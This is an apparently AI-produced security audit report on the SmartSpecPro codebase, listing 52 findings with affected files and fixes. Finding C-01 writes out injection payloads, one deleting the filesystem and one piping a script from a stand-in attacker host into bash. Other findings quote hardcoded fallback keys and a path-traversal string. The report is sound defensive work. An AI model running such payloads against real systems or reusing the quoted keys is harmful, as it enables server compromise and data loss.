# SmartSpecPro Security Audit Report

**Date:** 2026-02-07
**Auditors:** 5 AI Orchestra Agents (CMD-1, CMD-2, CMD-3, CMD-4+6, CMD-7)
**Scope:** Full codebase — frontend, backend (Node.js + Python), database, encryption, infrastructure

---

## Executive Summary

| Severity | Count | Description |
|----------|-------|-------------|
| CRITICAL | 13 | Immediate action required — exploitable vulnerabilities |
| HIGH | 15 | Fix within 1 week — significant risk |
| MEDIUM | 14 | Fix within 1 month — moderate risk |
| LOW | 10 | Fix during next refactor |
| **TOTAL** | **52** | Across all domains |

**Overall Assessment:** The codebase has strong fundamentals (proper auth layers, Zod validation, AES-256-GCM encryption, DOMPurify XSS protection), but contains critical vulnerabilities in command injection, credit system race conditions, unauthenticated API endpoints, and weak encryption in secondary crypto modules.

---

## CRITICAL Findings (13)

### C-01: Command Injection in Git Operations
- **Domain:** Backend (CMD-2)
- **File:** `apps/web/server/routers/skillRepositories.ts:198-211`
- **Issue:** Unsanitized `branch` parameter in `execSync` shell commands
- **Impact:** Full server compromise via `main; rm -rf /` or `main && curl attacker.com/shell.sh | bash`
- **Fix:** Validate branch with regex `/^[a-zA-Z0-9_\-\/]+$/`

### C-02: IDOR in Chat Message Deletion
- **Domain:** Backend (CMD-2)
- **File:** `apps/web/server/routers/chat.ts:499-521`
- **Issue:** `deleteMessage` checks conversation exists but not ownership — any user can delete any message if they know the ID
- **Fix:** Add `conversation.userId === ctx.user.id` check

### C-03: Unauthenticated Media Job Dispatch
- **Domain:** Python (CMD-3)
- **File:** `python-backend/app/api/v1/media_jobs.py:15-28`
- **Issue:** `POST /api/v1/media-jobs/execute` has zero authentication — any network-reachable caller can submit FFmpeg jobs impersonating any user
- **Fix:** Add `get_current_user` dependency or internal service token check

### C-04: Unauthenticated Kie.ai Callback
- **Domain:** Python (CMD-3)
- **File:** `python-backend/app/api/v1/media_generation.py:958-1049`
- **Issue:** Webhook callback has no signature verification — attacker can forge payloads to mark tasks as completed with malicious URLs
- **Fix:** Implement HMAC-SHA256 signature verification or IP allowlisting

### C-05: Credit Check Bypass via Environment Variable
- **Domain:** Python (CMD-3)
- **File:** `python-backend/app/llm_proxy/gateway_unified.py:631-633`
- **Issue:** `SKIP_CREDIT_CHECK=true` or `DEBUG=true` bypasses all billing, reads directly from `os.environ`
- **Fix:** Remove `DEBUG` bypass; gate `SKIP_CREDIT_CHECK` behind `ENVIRONMENT == "development"`

### C-06: Race Condition — Credit Deduction Without Rollback
- **Domain:** Backend/Bugs (CMD-2, CMD-7)
- **File:** `apps/web/server/services/creditService.ts:94-142`
- **Issue:** Credits deducted BEFORE API call with no rollback on failure; users lose money on failed generations
- **Fix:** Two-phase commit: reserve credits → call API → commit/refund

### C-07: Race Condition — Concurrent Credits Can Go Negative
- **Domain:** Bugs (CMD-7)
- **File:** `apps/web/server/services/creditService.ts:94-142`
- **Issue:** No database-level locking — two concurrent requests read same balance, both pass check, both deduct
- **Fix:** `UPDATE users SET credits = credits - ? WHERE id = ? AND credits >= ?` with RETURNING

### C-08: Weak Encryption in Storage Settings
- **Domain:** Database/Encryption (CMD-4+6)
- **File:** `apps/web/server/routers/storageSettings.ts:10-15`
- **Issue:** AES-256-CBC with `padEnd()` key derivation + hardcoded fallback key `"smartspec-storage-key-32chars!"`
- **Fix:** Use shared `encrypt()/decrypt()` from `crypto.ts` (AES-256-GCM)

### C-09: Plaintext Secrets in Tenant Settings
- **Domain:** Database (CMD-4+6)
- **File:** `apps/web/drizzle/schema.ts:597-615`
- **Issue:** `tenants.settings` JSON stores `mailchimpApiKey`, `stripePublicKey` in plaintext
- **Fix:** Migrate to encrypted columns; use `systemSettings` with `isSensitive: true`

### C-10: Auth Token in localStorage
- **Domain:** Frontend (CMD-1)
- **File:** `apps/web/client/src/pages/AuthCallback.tsx:58`
- **Issue:** `localStorage.setItem('auth_token', data.access_token)` — XSS steals JWT
- **Fix:** Use httpOnly cookies only; remove localStorage token storage

### C-11: Unvalidated OAuth Redirect
- **Domain:** Frontend (CMD-1)
- **File:** `apps/web/client/src/pages/Login.tsx:69-86`
- **Issue:** `returnUrl` validated with `endsWith('.smartspec.pro')` — attacker registers `evil.smartspec.pro`
- **Fix:** Explicit domain allowlist, not string suffix matching

### C-12: Weak OAuth State Token
- **Domain:** Frontend (CMD-1)
- **File:** `apps/web/client/src/contexts/AuthContext.tsx:199-206`
- **Issue:** `Math.random().toString(36).substring(7)` — ~32 bits entropy, CSRF exploitable
- **Fix:** `crypto.getRandomValues(new Uint8Array(32))` for 256-bit state

### C-13: Memory Leak — Unbounded Queue History
- **Domain:** Bugs (CMD-7)
- **File:** `apps/web/server/services/llmQueue.ts:796-862`
- **Issue:** `queueHistory` array grows indefinitely if collection interval doesn't trigger
- **Fix:** Enforce max size on every push, not just in snapshot callback

---

## HIGH Findings (15)

### H-01: SQL Injection Pattern in Admin API
- **File:** `python-backend/app/api/admin.py:567`
- **Issue:** f-string `LIMIT {limit} OFFSET {skip}` in raw SQL
- **Fix:** Parameterize: `LIMIT :limit OFFSET :skip`

### H-02: Hardcoded Dev Token Exposes Decrypted API Keys
- **File:** `python-backend/app/api/internal_provider.py:28`
- **Issue:** `"dev-token-smartspec-2026"` accepted when `DEBUG=true`, returns all provider keys
- **Fix:** Remove hardcoded token; use env-based random token

### H-03: Fixed Salt in Python PBKDF2
- **File:** `python-backend/app/core/encryption.py:43`
- **Issue:** `salt=b"smartspec-salt"` — same for all installations
- **Fix:** Per-installation random salt in env/secrets manager

### H-04: Default Encryption Key Fallback (Python)
- **File:** `python-backend/app/core/encryption.py:34-37`
- **Issue:** Falls back to `"smartspec-dev-key-change-in-production"` with only a warning
- **Fix:** Hard error if key not set

### H-05: `decode_token_unsafe` Disables All JWT Verification
- **File:** `python-backend/app/core/jwt_manager.py:207-225`
- **Issue:** Loaded gun — decodes without signature or expiry check
- **Fix:** Remove or rename to `_debug_only_never_use_in_auth`

### H-06: SSRF Validator Skips DNS Resolution (Both Node.js + Python)
- **Files:** `apps/web/server/routers/llmProviders.ts:18-42`, `python-backend/app/core/media_job_validators.py:51-64`
- **Issue:** Checks hostname format but not resolved IP — DNS rebinding bypasses
- **Fix:** Resolve DNS, check each IP against private ranges

### H-07: In-Memory Rate Limiter Not Multi-Instance Safe
- **Files:** `apps/web/server/_core/rateLimitedProcedure.ts`, `python-backend/app/core/security.py:227`
- **Issue:** Per-process `Map`/`dict` — bypassed by load balancer distribution
- **Fix:** Redis-backed rate limiting

### H-08: Control Plane Proxy Path Traversal
- **File:** `python-backend/app/api/control_plane_proxy.py:32-36`
- **Issue:** No path validation — `../../admin` reaches internal endpoints
- **Fix:** Validate path, whitelist forwarded headers

### H-09: Missing Rate Limiting on Admin Endpoints
- **File:** `apps/web/server/_core/trpc.ts`
- **Issue:** Admin procedures have no throttling — compromised admin token causes rapid mass damage
- **Fix:** Add `rateLimitedAdminProcedure`

### H-10: JWT Secret Weakness in Development
- **File:** `apps/web/server/_core/tokens.ts:8`
- **Issue:** Hardcoded fallback `"dev_jwt_secret_change_in_production"` if `NODE_ENV !== 'production'`
- **Fix:** Require JWT_SECRET in all environments

### H-11: Missing CSRF on Non-tRPC Endpoints
- **File:** `apps/web/server/_core/index.ts:209-223`
- **Issue:** CSRF middleware only on `/trpc`, not `/api/*`
- **Fix:** Apply origin check to all state-changing routes

### H-12: File Upload Extension-Only Validation
- **File:** `apps/web/server/routers/mediaJobs.ts:559-566`
- **Issue:** Client-provided filename extension — bypass via double extension
- **Fix:** Use magic bytes (`file-type` library) for MIME validation

### H-13: Data Inconsistency — Jobs Stuck in PROCESSING Forever
- **File:** `apps/web/server/routers/mediaJobs.ts:72-113`
- **Issue:** Stale cleanup only runs on new job submission, not periodically
- **Fix:** 5-minute cleanup cron via BullMQ scheduler

### H-14: Docker Executor Insufficient Command Quoting
- **File:** `python-backend/app/services/docker_executor.py:410-411`
- **Issue:** `bash -lc` with insufficient quoting — shell metachar injection
- **Fix:** Use `shlex.quote()` or array-based commands

### H-15: Missing Access Control on Full User Queries
- **File:** `apps/web/server/routers/users.ts:81-90`
- **Issue:** `db.select().from(users)` fetches ALL columns including password, twoFactorSecret
- **Fix:** Always use explicit column selection

---

## MEDIUM Findings (14)

| # | Issue | File |
|---|-------|------|
| M-01 | Default security keys in Python config | `python-backend/app/core/config.py:84-89` |
| M-02 | Admin seed prints password to stdout | `python-backend/app/core/seed.py:67` |
| M-03 | Error details leaked in HTTP responses | Multiple Python endpoints |
| M-04 | Credit deduction errors silently swallowed | `python-backend/app/api/openai_compat.py:221` |
| M-05 | Webhook URL not validated for SSRF | `python-backend/app/api/v1/webhooks.py:63` |
| M-06 | `python-jose` unmaintained with CVEs | `python-backend/requirements.txt:47` |
| M-07 | Anthropic SDK severely outdated (0.8.1) | `python-backend/requirements.txt:23` |
| M-08 | `adminProcedure` doesn't explicitly reject `domain_admin` | `apps/web/server/_core/trpc.ts:31-46` |
| M-09 | Missing HTTPS enforcement for external requests | Multiple Node.js services |
| M-10 | Insecure URL validation in SafeMarkdown | `apps/web/client/src/components/chat/SafeMarkdown.tsx:65-94` |
| M-11 | JSON.parse without validation in ErrorBoundary | `apps/web/client/src/components/videoeditor/ErrorBoundary.tsx:60` |
| M-12 | No CSP headers configured | Server-side |
| M-13 | Scheduler email failures silent | `apps/web/server/services/scheduler.ts:204-209` |
| M-14 | Tenant settings returns full object unauthenticated | `apps/web/server/routers/tenant.ts:25-38` |

---

## LOW Findings (10)

| # | Issue | File |
|---|-------|------|
| L-01 | Session token no rotation on role change | `apps/web/server/_core/sdk.ts` |
| L-02 | Content-Type validation missing | `apps/web/server/_core/index.ts:91` |
| L-03 | Error messages leak implementation details | Multiple routers |
| L-04 | Missing audit logging for admin actions | `users.ts`, `accountSecurity.ts` |
| L-05 | `smartspecweb_crypto.py` returns empty string on failure | `python-backend/app/core/smartspecweb_crypto.py:48` |
| L-06 | Logout accepts tokens without auth | `python-backend/app/api/auth.py:344` |
| L-07 | Stale Python dependency versions | `python-backend/requirements.txt` |
| L-08 | Stack traces shown in error boundary | `apps/web/client/src/components/ErrorBoundary.tsx:36` |
| L-09 | `window.open` without noopener | `SafeMarkdown.tsx:121`, `ImageLightbox.tsx:30` |
| L-10 | Missing index on messages.conversationId | Schema |

---

## Positive Security Practices

The codebase implements many strong patterns that should be acknowledged:

- **AES-256-GCM** authenticated encryption in main `crypto.ts` with random IV per encryption
- **Zod validation** on all tRPC inputs — comprehensive schema enforcement
- **DOMPurify** XSS protection with strict allowlist in SafeMarkdown
- **JWT + session cookies** with proper auth middleware chain
- **Celery JSON-only serializer** prevents pickle deserialization attacks
- **Subprocess list-based args** in Python (no `shell=True`)
- **Argon2id** password hashing with bcrypt migration support
- **Drizzle ORM** parameterized queries prevent SQL injection
- **Password reset tokens** hashed before storage
- **CORS origin allowlist** properly configured

---

## Recommended Fix Order (Prioritized)

### Phase 1: Critical Security (Days 1-3)
1. **C-01** Command injection — branch sanitization (1 file, 10 min)
2. **C-02** IDOR — add ownership check (1 file, 10 min)
3. **C-03** Unauthenticated media job endpoint (1 file, 30 min)
4. **C-04** Unauthenticated callback (1 file, 30 min)
5. **C-05** Credit check bypass via env var (1 file, 15 min)
6. **C-10** localStorage token → httpOnly cookie (2 files, 1 hour)
7. **C-11** Return URL validation (1 file, 20 min)
8. **C-12** OAuth state generation (1 file, 15 min)

### Phase 2: Data Integrity (Days 4-5)
9. **C-06** Credit rollback on API failure (2 files, 2 hours)
10. **C-07** Atomic credit deduction (1 file, 1 hour)
11. **C-08** Storage settings encryption upgrade (1 file, 1 hour)
12. **C-09** Migrate tenant plaintext secrets (schema + migration, 2 hours)
13. **C-13** Queue history bounds fix (1 file, 15 min)

### Phase 3: High Priority (Week 2)
14. **H-01** SQL injection parameterization
15. **H-02** Remove hardcoded dev token
16. **H-03 + H-04** Python encryption fixes
17. **H-06** SSRF DNS resolution
18. **H-07** Redis-backed rate limiting
19. **H-09** Admin rate limiting
20. **H-11** CSRF on all endpoints
21. **H-13** Job cleanup cron

### Phase 4: Medium + Low (Weeks 3-4)
22. Remaining MEDIUM and LOW findings
23. Dependency upgrades
24. CSP headers
25. Audit logging improvements
